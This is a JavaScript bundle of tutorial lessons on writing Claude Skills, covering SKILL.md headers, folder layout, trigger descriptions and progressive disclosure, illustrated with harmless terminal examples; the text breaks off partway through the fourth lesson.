(function(m,c){var L=window.ACADEMY.lessons;for(var id in c){Object.assign(L[id],c[id]);}(window.ACADEMY_LOADED=window.ACADEMY_LOADED||{})[m]=1;})("claude-skills",{"claude-skills/what-a-claude-skill-is":{"html":"\u003cp>You have written the same long prompt many times: how your team formats a report, how to review a pull request, how to fill in a template. A Claude Skill packages that know-how once, so Claude can load it when the task appears and ignore it otherwise. This module shows how to design, write, test and share skills. Product features change quickly, so check the current documentation for details such as limits and where skills are supported.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>What a skill is and what it contains\u003c/li>\n\u003cli>How skills differ from prompts, projects and tools\u003c/li>\n\u003cli>Where skills run and who writes them\u003c/li>\n\u003cli>When a skill is the right choice\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"the-idea\">The idea\u003c/h2>\n\u003cp>A skill is a folder. At minimum it holds a file named \u003ccode>SKILL.md\u003c/code> that starts with a short header giving the skill&#39;s \u003cstrong>name\u003c/strong> and a \u003cstrong>description\u003c/strong> of what it does and when to use it, followed by instructions in plain Markdown. The folder can also hold reference documents, templates and scripts. Claude sees the names and descriptions of available skills up front, and when a request matches, it reads the rest. The result is expertise on demand without a huge prompt in every conversation.\u003c/p>\n\u003ch2 id=\"skills-compared-with-other-things\">Skills compared with other things\u003c/h2>\n\u003cul>\n\u003cli>\u003cstrong>A prompt\u003c/strong> lives in one conversation. A skill is reusable and loaded only when relevant.\u003c/li>\n\u003cli>\u003cstrong>A system prompt or project instructions\u003c/strong> are always present. A skill&#39;s body is loaded only when needed, so it can be large without costing tokens all the time.\u003c/li>\n\u003cli>\u003cstrong>A tool\u003c/strong> (function or MCP server) performs an action or fetches data. A skill supplies know-how, and may tell Claude how to use tools or run bundled scripts. They work together.\u003c/li>\n\u003cli>\u003cstrong>Fine-tuning\u003c/strong> changes a model. A skill is just files you can read, edit and review.\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"where-they-are-used\">Where they are used\u003c/h2>\n\u003cp>Skills are supported in several Claude products, such as the Claude apps, Claude Code and the API, with differences in how you install them: for example, a folder placed in a known directory in Claude Code, an upload in an app, or a reference in an API request. Some environments allow skills to run code, which is powerful and needs the care described in the security lesson. Because support evolves, treat the product documentation as the source of truth for setup steps.\u003c/p>\n\u003ch2 id=\"when-to-write-one\">When to write one\u003c/h2>\n\u003cp>Write a skill when: the task repeats; the right way is specific to your team or domain; it takes more than a few lines of instruction; it benefits from templates, checklists or a script; and several people should get the same behaviour. Do not write one for a one-off question, or for general knowledge the model already has. Start by doing the task with Claude a few times, note what you had to correct, and put those corrections in the skill.\u003c/p>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> Your team wants every release note to follow a template and a tone guide. A single long prompt in everyone's notes app, or a skill?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> A skill: it is shared, versioned, and loaded only when someone asks for release notes.\u003c/p>\u003cp>Repeatable, team-specific work.\u003c/p>\u003c/div>\u003c/div>\n\u003ch2 id=\"incident-the-copy-pasted-prompt\">Incident: The copy-pasted prompt\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>Five engineers each kept a slightly different copy of the &quot;write an incident summary&quot; prompt.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"diff prompt-anita.txt prompt-ravi.txt | wc -l\nls skills/incident-summary/\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>diff prompt-anita.txt prompt-ravi.txt | \u003cspan class=\"hljs-built_in\">wc\u003c/span> -l\u003c/span>\u003cspan class=\"ln out\">38\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>\u003cspan class=\"hljs-built_in\">ls\u003c/span> skills/incident-summary/\u003c/span>\u003cspan class=\"ln out\">SKILL.md  template.md  examples/\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Each copy had drifted, so summaries differed in format and missed the impact section. The team moved the instructions, the template and two examples into one skill folder, kept it in version control and reviewed changes by pull request. Summaries became consistent, and improvements reached everyone at once.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Writing a skill for something the model already does well\u003c/li>\n\u003cli>Putting everything in one giant file\u003c/li>\n\u003cli>Treating a skill as a place for secrets\u003c/li>\n\u003cli>Assuming every product supports skills identically\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"the-idea","text":"The idea"},{"id":"skills-compared-with-other-things","text":"Skills compared with other things"},{"id":"where-they-are-used","text":"Where they are used"},{"id":"when-to-write-one","text":"When to write one"},{"id":"incident-the-copy-pasted-prompt","text":"Incident: The copy-pasted prompt"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Claude documentation: Agent Skills overview","u":"https://docs.claude.com/en/docs/agents-and-tools/agent-skills/overview"},{"t":"Claude Code documentation: Skills","u":"https://docs.claude.com/en/docs/claude-code/skills"}],"text":"You have written the same long prompt many times: how your team formats a report, how to review a pull request, how to fill in a template. A Claude Skill packages that know-how once, so Claude can load it when the task appears and ignore it otherwise. This module shows how to design, write, test and share skills. Product features change quickly, so check the current documentation for details such as limits and where skills are supported. What you will learn What a skill is and what it contains How skills differ from prompts, projects and tools Where skills run and who writes them When a skill is the right choice The idea A skill is a folder. At minimum it holds a file named SKILL.md that starts with a short header giving the skill&#39;s name and a description of what it does and when to use it, followed by instructions in plain Markdown. The folder can also hold reference documents, templates and scripts. Claude sees the names and descriptions of available skills up front, and when a request matches, it reads the rest. The result is expertise on demand without a huge prompt in every conversation. Skills compared with other things A prompt lives in one conversation. A skill is reusable and loaded only when relevant. A system prompt or project instructions are always present. A skill&#39;s body is loaded only when needed, so it can be large without costing tokens all the time. A tool (function or MCP server) performs an action or fetches data. A skill supplies know-how, and may tell Claude how to use tools or run bundled scripts. They work together. Fine-tuning changes a model. A skill is just files you can read, edit and review. Where they are used Skills are supported in several Claude products, such as the Claude apps, Claude Code and the API, with differences in how you install them: for example, a folder placed in a known directory in Claude Code, an upload in an app, or a reference in an API request. Some environments allow skills to run code, which is powerful and needs the care described in the security lesson. Because support evolves, treat the product documentation as the source of truth for setup steps. When to write one Write a skill when: the task repeats; the right way is specific to your team or domain; it takes more than a few lines of instruction; it benefits from templates, checklists or a script; and several people should get the same behaviour. Do not write one for a one-off question, or for general knowledge the model already has. Start by doing the task with Claude a few times, note what you had to correct, and put those corrections in the skill. Predict first. Your team wants every release note to follow a template and a tone guide. A single long prompt in everyone's notes app, or a skill? Your guess Answer: A skill: it is shared, versioned, and loaded only when someone asks for release notes. Repeatable, team-specific work. Incident: The copy-pasted prompt Incident Five engineers each kept a slightly different copy of the \"write an incident summary\" prompt. $ diff prompt-anita.txt prompt-ravi.txt | wc -l 38 $ ls skills/incident-summary/ SKILL.md template.md examples/ Each copy had drifted, so summaries differed in format and missed the impact section. The team moved the instructions, the template and two examples into one skill folder, kept it in version control and reviewed changes by pull request. Summaries became consistent, and improvements reached everyone at once. Common mistakes Writing a skill for something the model already does well Putting everything in one giant file Treating a skill as a place for secrets Assuming every product supports skills identically"},"claude-skills/anatomy-of-a-skill-folder":{"html":"\u003cp>A skill is only a folder, so structure is everything. A clear layout makes it easy for Claude to find what it needs and for people to review and maintain. This lesson walks through the files and the rules for the header.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>The SKILL.md header: name and description\u003c/li>\n\u003cli>The body: instructions Claude follows\u003c/li>\n\u003cli>Supporting files: references, templates, scripts, assets\u003c/li>\n\u003cli>Naming and size guidelines\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"a-minimal-skill\">A minimal skill\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"text\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"incident-summary/\n  SKILL.md\n  template.md\n  examples/\n    outage-example.md\n  scripts/\n    check_summary.py\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">incident-summary/\n  SKILL.md\n  template.md\n  examples/\n    outage-example.md\n  scripts/\n    check_summary.py\u003c/code>\u003c/pre>\u003c/div>\n\u003cdiv class=\"code\" data-lang=\"text\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"---\nname: incident-summary\ndescription: Write a blameless incident summary from notes, logs or a timeline. Use when the user asks for an incident summary, post-incident report, or outage write-up.\n---\n\nWrite the summary using template.md.\nSteps:\n1. Collect facts: start time, end time, impact, detection, mitigation.\n2. State only what the notes support; write &quot;not stated&quot; otherwise.\n3. Keep it under 300 words and avoid blaming individuals.\n4. Run scripts/check_summary.py on the result and fix what it reports.\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">---\nname: incident-summary\ndescription: Write a blameless incident summary from notes, logs or a timeline. Use when the user asks for an incident summary, post-incident report, or outage write-up.\n---\n\nWrite the summary using template.md.\nSteps:\n1. Collect facts: start time, end time, impact, detection, mitigation.\n2. State only what the notes support; write &quot;not stated&quot; otherwise.\n3. Keep it under 300 words and avoid blaming individuals.\n4. Run scripts/check_summary.py on the result and fix what it reports.\u003c/code>\u003c/pre>\u003c/div>\n\u003ch2 id=\"the-header\">The header\u003c/h2>\n\u003cp>The header sits between two lines of three dashes at the top of SKILL.md. Two fields are required: \u003cstrong>name\u003c/strong> and \u003cstrong>description\u003c/strong>. The name is short, in lowercase letters, numbers and hyphens (documentation sets a maximum length), and usually matches the folder name. The description says \u003cstrong>what the skill does and when to use it\u003c/strong>, and has a maximum length set by the platform, so check current limits. Other optional fields exist in some products, for example to restrict which tools a skill may use; read the documentation for your environment.\u003c/p>\n\u003ch2 id=\"the-body-and-supporting-files\">The body and supporting files\u003c/h2>\n\u003cp>The body is plain Markdown that tells Claude what to do. Use imperative sentences, short numbered steps, and concrete examples. When material is long or only sometimes needed, move it into separate files and link to it from SKILL.md: &quot;For the full format, read \u003ccode>reference/format.md\u003c/code>.&quot; Put templates in their own files, put examples in an \u003ccode>examples\u003c/code> folder, and put scripts in \u003ccode>scripts\u003c/code>. Files are read or run only when needed.\u003c/p>\n\u003ch2 id=\"size-and-naming\">Size and naming\u003c/h2>\n\u003cp>Keep SKILL.md focused; a common guideline is a body of a few hundred lines at most, with detail pushed into linked files. Use clear, consistent file names. Use forward slashes in paths, avoid deeply nested chains of files that point to each other, and never include secrets or personal data. Add a short comment in each script saying what it does and what it needs. A reviewer should understand the skill in five minutes by reading the folder.\u003c/p>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> SKILL.md has grown to 900 lines with API tables, a style guide and three templates. What do you do?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> Keep the workflow in SKILL.md, and move tables, style guide and templates into separate linked files that are read when needed.\u003c/p>\u003cp>Split by when it is needed.\u003c/p>\u003c/div>\u003c/div>\n\u003ch2 id=\"incident-the-skill-nobody-could-review\">Incident: The skill nobody could review\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A pull request added a skill with one 1,400-line SKILL.md file.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"wc -l skills/api-review/SKILL.md\nls skills/api-review\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>\u003cspan class=\"hljs-built_in\">wc\u003c/span> -l skills/api-review/SKILL.md\u003c/span>\u003cspan class=\"ln out\">1412 skills/api-review/SKILL.md\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>\u003cspan class=\"hljs-built_in\">ls\u003c/span> skills/api-review\u003c/span>\u003cspan class=\"ln out\">SKILL.md\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The reviewer could not tell which parts mattered, and Claude loaded all 1,400 lines for every API question. The author split it into a 90-line SKILL.md with the workflow and linked reference files for the style guide, error formats and examples. Reviews took minutes and answers improved.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>One giant SKILL.md\u003c/li>\n\u003cli>Names that do not match the folder or follow the rules\u003c/li>\n\u003cli>Chains of files that link to other files\u003c/li>\n\u003cli>Secrets or personal data in the folder\u003c/li>\n\u003c/ul>\n\u003cp>Practice: open the \u003ca href=\"#/skill-lab\">skill-writing lab\u003c/a> to write or fix a SKILL.md and have it checked in your browser.\u003c/p>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"a-minimal-skill","text":"A minimal skill"},{"id":"the-header","text":"The header"},{"id":"the-body-and-supporting-files","text":"The body and supporting files"},{"id":"size-and-naming","text":"Size and naming"},{"id":"incident-the-skill-nobody-could-review","text":"Incident: The skill nobody could review"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Claude documentation: Skill authoring best practices","u":"https://docs.claude.com/en/docs/agents-and-tools/agent-skills/best-practices"},{"t":"Claude documentation: Agent Skills overview","u":"https://docs.claude.com/en/docs/agents-and-tools/agent-skills/overview"}],"text":"A skill is only a folder, so structure is everything. A clear layout makes it easy for Claude to find what it needs and for people to review and maintain. This lesson walks through the files and the rules for the header. What you will learn The SKILL.md header: name and description The body: instructions Claude follows Supporting files: references, templates, scripts, assets Naming and size guidelines A minimal skill incident-summary/ SKILL.md template.md examples/ outage-example.md scripts/ check_summary.py --- name: incident-summary description: Write a blameless incident summary from notes, logs or a timeline. Use when the user asks for an incident summary, post-incident report, or outage write-up. --- Write the summary using template.md. Steps: 1. Collect facts: start time, end time, impact, detection, mitigation. 2. State only what the notes support; write \"not stated\" otherwise. 3. Keep it under 300 words and avoid blaming individuals. 4. Run scripts/check_summary.py on the result and fix what it reports. The header The header sits between two lines of three dashes at the top of SKILL.md. Two fields are required: name and description . The name is short, in lowercase letters, numbers and hyphens (documentation sets a maximum length), and usually matches the folder name. The description says what the skill does and when to use it , and has a maximum length set by the platform, so check current limits. Other optional fields exist in some products, for example to restrict which tools a skill may use; read the documentation for your environment. The body and supporting files The body is plain Markdown that tells Claude what to do. Use imperative sentences, short numbered steps, and concrete examples. When material is long or only sometimes needed, move it into separate files and link to it from SKILL.md: \"For the full format, read reference/format.md .\" Put templates in their own files, put examples in an examples folder, and put scripts in scripts . Files are read or run only when needed. Size and naming Keep SKILL.md focused; a common guideline is a body of a few hundred lines at most, with detail pushed into linked files. Use clear, consistent file names. Use forward slashes in paths, avoid deeply nested chains of files that point to each other, and never include secrets or personal data. Add a short comment in each script saying what it does and what it needs. A reviewer should understand the skill in five minutes by reading the folder. Predict first. SKILL.md has grown to 900 lines with API tables, a style guide and three templates. What do you do? Your guess Answer: Keep the workflow in SKILL.md, and move tables, style guide and templates into separate linked files that are read when needed. Split by when it is needed. Incident: The skill nobody could review Incident A pull request added a skill with one 1,400-line SKILL.md file. $ wc -l skills/api-review/SKILL.md 1412 skills/api-review/SKILL.md $ ls skills/api-review SKILL.md The reviewer could not tell which parts mattered, and Claude loaded all 1,400 lines for every API question. The author split it into a 90-line SKILL.md with the workflow and linked reference files for the style guide, error formats and examples. Reviews took minutes and answers improved. Common mistakes One giant SKILL.md Names that do not match the folder or follow the rules Chains of files that link to other files Secrets or personal data in the folder Practice: open the skill-writing lab to write or fix a SKILL.md and have it checked in your browser."},"claude-skills/writing-descriptions-that-trigger":{"html":"\u003cp>Claude decides whether to use a skill by reading its name and description, long before it sees the body. A skill with a vague description is never used, and one with an over-broad description fires at the wrong times. Getting the description right is the single most valuable thing you can do for a skill.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>What the description must do\u003c/li>\n\u003cli>Patterns that work: what, when, and trigger words\u003c/li>\n\u003cli>Avoid being too narrow or too broad\u003c/li>\n\u003cli>Test with real requests, including near misses\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"its-job\">Its job\u003c/h2>\n\u003cp>The description answers two questions for the model: \u003cstrong>What can this skill do?\u003c/strong> and \u003cstrong>When should I reach for it?\u003c/strong> It is the only part visible when Claude chooses, so it must carry enough meaning to match many ways people phrase a request. Write it in the third person (&quot;Writes...&quot;, &quot;Use when...&quot;), and include the nouns and verbs users actually use.\u003c/p>\n\u003ch2 id=\"weak-and-strong\">Weak and strong\u003c/h2>\n\u003cp>Weak: \u003ccode>Helps with documents.\u003c/code> Claude cannot tell when this applies, and it competes with everything.\u003c/p>\n\u003cp>Better: \u003ccode>Create and edit Word documents (.docx) with headings, tables, tracked changes and comments. Use when the user asks for a Word file, a .docx, a report or memo as a Word document, or to edit or review an existing .docx.\u003c/code>\u003c/p>\n\u003cp>It names the format, lists capabilities, and gives trigger phrases, including the extension. For an internal skill: \u003ccode>Review Terraform plans for risky changes such as destroys, replaced databases and open security groups. Use when the user shares terraform plan output or asks if an apply is safe.\u003c/code>\u003c/p>\n\u003ch2 id=\"balance\">Balance\u003c/h2>\n\u003cul>\n\u003cli>\u003cstrong>Too narrow\u003c/strong>: &quot;Use when the user says exactly &quot;run the weekly report&quot;&quot; misses &quot;can you make this week&#39;s numbers summary&quot;.\u003c/li>\n\u003cli>\u003cstrong>Too broad\u003c/strong>: &quot;Use for anything about files&quot; triggers constantly and loads text for nothing.\u003c/li>\n\u003cli>Mention \u003cstrong>exclusions\u003c/strong> when neighbours exist: &quot;Not for spreadsheets; use the spreadsheet skill&quot;.\u003c/li>\n\u003cli>Keep within the length limit, and put the most important words first.\u003c/li>\n\u003cli>Avoid marketing language. Plain, specific verbs and objects work best.\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"test-it\">Test it\u003c/h2>\n\u003cp>Make a list of 10 requests that should trigger the skill (varied phrasing, with and without the file extension or tool name) and 10 that should not (near misses). Run them in the product you use and note which fire. Adjust the description, not the body, to fix triggering. Re-run after every edit. Keep this list in the skill&#39;s repository as your trigger test.\u003c/p>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> Your skill &quot;Use for Kubernetes things&quot; fires on every infrastructure question and loads a long body. How do you fix it?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> Narrow the description to specific tasks and trigger phrases, add exclusions, and test with near-miss requests.\u003c/p>\u003cp>Specific verbs and objects.\u003c/p>\u003c/div>\u003c/div>\n\u003ch2 id=\"incident-the-skill-that-never-loaded\">Incident: The skill that never loaded\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A team wrote a careful skill for security reviews, but nobody saw it used.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"cat skills/sec-review/SKILL.md | head -4\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>\u003cspan class=\"hljs-built_in\">cat\u003c/span> skills/sec-review/SKILL.md | \u003cspan class=\"hljs-built_in\">head\u003c/span> -4\u003c/span>\u003cspan class=\"ln out\">---\u003c/span>\u003cspan class=\"ln out\">name: sec-review\u003c/span>\u003cspan class=\"ln out\">description: Security stuff.\u003c/span>\u003cspan class=\"ln out\">---\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The description gave no hint about what the skill did or when to use it, so requests such as &quot;can you check this Dockerfile for risky settings&quot; never matched. The new description named Dockerfiles, Kubernetes manifests, IAM policies and pull request reviews, listed trigger phrases, and excluded general coding questions. Triggering went from 2 of 10 to 9 of 10 sample requests.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Descriptions with no &quot;when to use&quot;\u003c/li>\n\u003cli>Over-broad descriptions that fire everywhere\u003c/li>\n\u003cli>Only one phrasing of the request\u003c/li>\n\u003cli>Fixing triggering by editing the body\u003c/li>\n\u003c/ul>\n\u003cp>Practice: open the \u003ca href=\"#/skill-lab\">skill-writing lab\u003c/a> to write or fix a SKILL.md and have it checked in your browser.\u003c/p>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"its-job","text":"Its job"},{"id":"weak-and-strong","text":"Weak and strong"},{"id":"balance","text":"Balance"},{"id":"test-it","text":"Test it"},{"id":"incident-the-skill-that-never-loaded","text":"Incident: The skill that never loaded"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Claude documentation: Skill authoring best practices","u":"https://docs.claude.com/en/docs/agents-and-tools/agent-skills/best-practices"},{"t":"Claude Code documentation: Skills","u":"https://docs.claude.com/en/docs/claude-code/skills"}],"text":"Claude decides whether to use a skill by reading its name and description, long before it sees the body. A skill with a vague description is never used, and one with an over-broad description fires at the wrong times. Getting the description right is the single most valuable thing you can do for a skill. What you will learn What the description must do Patterns that work: what, when, and trigger words Avoid being too narrow or too broad Test with real requests, including near misses Its job The description answers two questions for the model: What can this skill do? and When should I reach for it? It is the only part visible when Claude chooses, so it must carry enough meaning to match many ways people phrase a request. Write it in the third person (\"Writes...\", \"Use when...\"), and include the nouns and verbs users actually use. Weak and strong Weak: Helps with documents. Claude cannot tell when this applies, and it competes with everything. Better: Create and edit Word documents (.docx) with headings, tables, tracked changes and comments. Use when the user asks for a Word file, a .docx, a report or memo as a Word document, or to edit or review an existing .docx. It names the format, lists capabilities, and gives trigger phrases, including the extension. For an internal skill: Review Terraform plans for risky changes such as destroys, replaced databases and open security groups. Use when the user shares terraform plan output or asks if an apply is safe. Balance Too narrow : \"Use when the user says exactly \"run the weekly report\"\" misses \"can you make this week&#39;s numbers summary\". Too broad : \"Use for anything about files\" triggers constantly and loads text for nothing. Mention exclusions when neighbours exist: \"Not for spreadsheets; use the spreadsheet skill\". Keep within the length limit, and put the most important words first. Avoid marketing language. Plain, specific verbs and objects work best. Test it Make a list of 10 requests that should trigger the skill (varied phrasing, with and without the file extension or tool name) and 10 that should not (near misses). Run them in the product you use and note which fire. Adjust the description, not the body, to fix triggering. Re-run after every edit. Keep this list in the skill&#39;s repository as your trigger test. Predict first. Your skill \"Use for Kubernetes things\" fires on every infrastructure question and loads a long body. How do you fix it? Your guess Answer: Narrow the description to specific tasks and trigger phrases, add exclusions, and test with near-miss requests. Specific verbs and objects. Incident: The skill that never loaded Incident A team wrote a careful skill for security reviews, but nobody saw it used. $ cat skills/sec-review/SKILL.md | head -4 --- name: sec-review description: Security stuff. --- The description gave no hint about what the skill did or when to use it, so requests such as \"can you check this Dockerfile for risky settings\" never matched. The new description named Dockerfiles, Kubernetes manifests, IAM policies and pull request reviews, listed trigger phrases, and excluded general coding questions. Triggering went from 2 of 10 to 9 of 10 sample requests. Common mistakes Descriptions with no \"when to use\" Over-broad descriptions that fire everywhere Only one phrasing of the request Fixing triggering by editing the body Practice: open the skill-writing lab to write or fix a SKILL.md and have it checked in your browser."},"claude-skills/progressive-disclosure-and-structure":{"html":"\u003cp>Context is limited and costly. If a skill pours everything into the conversation at once, there is less room for the user&#39;s own material, and the model has more to ignore. Progressive disclosure means information arrives in layers, only when the task calls for it. Good structure makes skills powerful without making them heavy.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>The three levels: metadata, instructions, resources\u003c/li>\n\u003cli>What to put at each level\u003c/li>\n\u003cli>Link patterns that keep depth shallow\u003c/li>\n\u003cli>Measure what a skill costs in tokens\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"three-levels\">Three levels\u003c/h2>\n\u003col>\n\u003cli>\u003cstrong>Metadata\u003c/strong> (name and description): always available, a few dozen tokens per skill. This is what lets Claude know a skill exists.\u003c/li>\n\u003cli>\u003cstrong>Instructions\u003c/strong> (the body of SKILL.md): loaded when the skill is triggered.\u003c/li>\n\u003cli>\u003cstrong>Resources\u003c/strong> (other files, scripts, templates): read or run only if the instructions point to them and the task needs them. A script that runs can return just its result, without its source entering the context.\u003c/li>\n\u003c/ol>\n\u003cp>This is why you can install many skills without slowing every conversation.\u003c/p>\n\u003ch2 id=\"what-goes-where\">What goes where\u003c/h2>\n\u003cul>\n\u003cli>\u003cstrong>Level 1\u003c/strong>: trigger-quality description only.\u003c/li>\n\u003cli>\u003cstrong>Level 2\u003c/strong>: the workflow: when to do what, decisions, key rules, and links to detail. Aim for the shortest body that produces correct results.\u003c/li>\n\u003cli>\u003cstrong>Level 3\u003c/strong>: long reference tables, full style guides, API specifications, big templates, examples for rare cases, and scripts for exact work.\u003c/li>\n\u003c/ul>\n\u003cp>A useful test: if a section is needed in less than a third of uses, move it to a linked file.\u003c/p>\n\u003ch2 id=\"linking\">Linking\u003c/h2>\n\u003cp>In SKILL.md write precise pointers: &quot;If the user needs Kubernetes manifests, read \u003ccode>reference/k8s.md\u003c/code>. For Dockerfiles, read \u003ccode>reference/docker.md\u003c/code>.&quot; Keep links one level deep from SKILL.md rather than chains where file A points to file B that points to file C, because deep chains lead to partial reads. For a long reference file, begin with a short contents list so the reader can jump to a section. Name files by content (\u003ccode>reference/error-codes.md\u003c/code>), not by number.\u003c/p>\n\u003ch2 id=\"measure\">Measure\u003c/h2>\n\u003cp>Check how big your skill is at each level. Count tokens of the description (small), the body (hundreds to a couple of thousand) and the largest linked file. Compare answer quality with and without a section. If a long section does not change results in your tests, delete it. A shorter skill is cheaper, faster and easier to keep correct. Re-measure after edits.\u003c/p>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> A skill's SKILL.md includes a 400-line error code table used in 1 of 10 requests. What do you change?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> Move the table to a linked reference file and point to it from SKILL.md only for error-related requests.\u003c/p>\u003cp>Load on need.\u003c/p>\u003c/div>\u003c/div>\n\u003ch2 id=\"incident-the-skill-that-crowded-out-the-document\">Incident: The skill that crowded out the document\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>Users pasted long contracts and got shallow answers once a legal skill was active.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"wc -w skills/contract-review/SKILL.md skills/contract-review/reference/*.md\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>\u003cspan class=\"hljs-built_in\">wc\u003c/span> -w skills/contract-review/SKILL.md skills/contract-review/reference/*.md\u003c/span>\u003cspan class=\"ln out\">  6120 skills/contract-review/SKILL.md\u003c/span>\u003cspan class=\"ln out\">  2200 skills/contract-review/reference/clauses.md\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The skill put its entire clause library in SKILL.md, so every use consumed thousands of tokens that the user&#39;s document needed. After moving the library to a reference file read only for clause lookups, the body fell to 700 words and long contracts were handled better.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Putting everything in the body\u003c/li>\n\u003cli>Deep chains of linked files\u003c/li>\n\u003cli>Long reference files without a contents list\u003c/li>\n\u003cli>Never measuring size\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"three-levels","text":"Three levels"},{"id":"what-goes-where","text":"What goes where"},{"id":"linking","text":"Linking"},{"id":"measure","text":"Measure"},{"id":"incident-the-skill-that-crowded-out-the-document","text":"Incident: The 